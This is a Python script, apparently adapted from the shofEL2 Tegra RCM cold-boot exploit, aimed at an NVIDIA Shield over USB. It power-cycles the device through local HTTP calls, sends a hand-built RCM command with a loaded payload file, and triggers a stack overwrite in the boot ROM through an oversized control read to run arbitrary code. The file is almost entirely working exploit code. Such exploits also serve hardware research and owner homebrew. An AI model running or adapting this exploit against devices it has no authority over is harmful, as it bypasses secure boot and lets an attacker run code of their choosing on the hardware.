#!/usr/bin/env python3

# shofEL2 nintendo switch (and related) cold boot exploit
#------------------------------------------------------------------------------
# Switch will enter RCM if (PMC_SCRATCH0 & 2) is set, or if coldboot path
# fails to find something to boot. So just disconnect/corrupt emmc during
# early boot.
import usb.core
import usb.util
import errno
import time
import binascii
import struct
import sys
import os
import hashlib
import ctypes
import fcntl
import platform
import requests

def parse32(buf, offset):
    return struct.unpack('<L', buf[offset:offset+4])[0]

def wait_for_device(dev_id):
    dev = usb.core.find(idVendor=dev_id[0], idProduct=dev_id[1])
    while dev is None:
        time.sleep(0.1)
        dev = usb.core.find(idVendor=dev_id[0], idProduct=dev_id[1])
    return dev

class RCM:
    DEV_ID_SHIELD_K1 = (0x0955, 0x7f40)
    EP1_OUT = usb.util.ENDPOINT_OUT | 1
    EP1_IN = usb.util.ENDPOINT_IN | 1

    def __init__(s):
        try:
            requests.get('http://192.168.2.113/off')
        except:
            print('Shield OFF')
        
        try:
            requests.get('http://192.168.2.113/on')
        except:
            print('Shield ON')

        s.dev = wait_for_device(s.DEV_ID_SHIELD_K1)

    def ep1_read(s, size): return s.dev.read(s.EP1_IN, size)

    def ep1_write(s, size): return s.dev.write(s.EP1_OUT, size)

    def read_init_msg(s):
        # rcm_send_chip_id_and_version
        try:
            return s.ep1_read(0x10)
        except:
            return b''

    def ep0_read(s, size):
        return s.dev.ctrl_transfer(0x82, 0, 0, 0, size)

    def ep0_read_unbounded(s, size):
        print("Size: 0x%x\n" % size)
        try:
            ret = s.dev.ctrl_transfer(0x82, 0, 0, 0, size)
            print(binascii.hexlify(ret))
        except usb.core.USBError:
            print("timeout.. good!")

    def sanity_check(s, src_base, dst_base):
        # check the stack and buffers look as expected
        buf = s.ep0_read(0x1000)
        cur_src = parse32(buf, 0xc)
        cur_dst = parse32(buf, 0x14)
        print(hex(cur_src))
        print(hex(cur_dst))
        print(binascii.hexlify(buf[:0x20]))
        assert cur_src == src_base and cur_dst == dst_base

    def pwn(s):

        # this is sp+0xC
        src_base = 0x4000DCF4
        # memcpy pushes r4,lr
        # memcpy_wrapper pushes r0,lr
        target = src_base - 0xC - 2 * 4 - 2 * 4 - 4
        print('tarfet %x' % (target))
        dst_base0 = 0x40004000
        dst_base1 = 0x40008000
        overwrite_len = target - dst_base1
        payload_base = 0x4000E000

        # rom is in rcm_send_chip_id_and_version
        # unblock it
        init_msg = s.read_init_msg()
        print(binascii.hexlify(init_msg))

        # now in rcm_recv_buf
        s.sanity_check(src_base, dst_base1)

        # The RCM CMD looks a litte bit different from the used on X1, as described on tegrarcm.
        # Size restrictions are not the same neither the format.
        # lenght RCM CMD 0x021964
        payload = bytes( [
            # Len Insecure uint32
            0x64, 0x19, 0x02, 0x00,
            # Modulus uint8[256]
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            # CMAC_HASH uint8[16]
            0xF6, 0xD3, 0x57, 0xC2, 0xB9, 0x0C, 0xF9, 0xE7, 0xDF, 0x4C, 0x78, 0xD0, 0x29, 0x9B, 0x11, 0x84,
            # RDA_PSS_SIG uint32[256]
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            # Reserved uint8[16]
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            # ECID uint32[4]
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            # Opcode uint32
            0x04, 0x00, 0x00, 0x00,
            # Len Secure uint32
            0x64, 0x19, 0x02, 0x00,
            # Payload Len uint32
            0xD8, 0x16, 0x02, 0x00,
            #Â RCM Version uint32
            0x01, 0x00, 0x40, 0x00,
            # Args uint8[48]
            0x00, 0xE0, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            # Pading uint8[16]
            0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

        ] )

        # need to build payload buffer
        # write payload
        payload += (b'\0' * 0x59CC)
        entry = payload_base + len(payload) + 4
        entry |= 1
        print('entry %x' % (entry))
        payload += entry.to_bytes(4, byteorder='little')

        payload_filename = 'cbfs.bin'
        payload += open(payload_filename, 'rb').read()

        # Dummy payload
#        for i in range(0, 0x19, 1):
#            payload +=  b'\xAA' * 0x1000

        # Pad the payload to fill a USB request exactly, so we don't send a short
        # packet and break out of the RCM loop.
#        payload_length = len(payload)
#        padding_size   = 0x1000 - (payload_length % 0x1000)
#        payload += (b'\xBB' * padding_size)

        xfer_len = 0x1000
        for i in range(0, len(payload), xfer_len):
            s.ep1_write(payload[i:i+xfer_len])

        try:
            s.sanity_check( src_base, dst_base1 )
        except:
            print('throwing more')
            s.ep1_write( b'\xCC' * xfer_len )
            s.sanity_check( src_base, dst_base1 )

        # Trigger stack overwrite from the payload buf (accessed by reading off the end of rcm_xfer_buffers[1])
        print( "Performing hax... Overwriting: %x bytes" % ( overwrite_len ) )
        s.ep0_read_unbounded(overwrite_len)

        (offset, length) = struct.unpack('>II', s.ep1_read(8))

rcm = RCM()
rcm.pwn()
